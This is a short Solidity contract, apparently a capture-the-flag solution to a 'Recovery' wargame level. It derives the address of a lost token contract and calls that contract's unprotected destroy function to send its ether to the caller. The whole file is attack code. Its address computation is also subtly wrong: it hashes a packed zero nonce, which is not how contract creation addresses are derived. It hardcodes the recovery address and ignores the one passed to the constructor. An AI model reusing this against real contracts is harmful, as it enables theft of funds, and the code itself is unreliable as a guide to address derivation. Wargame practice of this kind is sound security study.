pragma solidity ^0.8.0;

interface Recovery {
    function generateToken(string memory _name, uint256 _initialSupply) external;
}


interface SimpleToken {
    function destroy(address payable _to) external;
}


contract FixAttacker {
    address immutable recovery;

    constructor(address _recovery) {
        recovery = _recovery;
    }

    // Compute address of first SimpleToken deployed by Recovery
    function getTokenAddress() public view returns (address) {
        address recoveryAddress = 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be;
        bytes8 nonce = bytes8(uint64(0)); // First deployment from Recovery
        bytes32 hash = keccak256(abi.encodePacked(bytes20(recoveryAddress), nonce));
        return address(uint160(uint256(hash)));
    }

    // Destroy the token with calculated address
    function attack() external {
        address tokenAddress = getTokenAddress();
        SimpleToken(tokenAddress).destroy(payable(msg.sender));
    }
}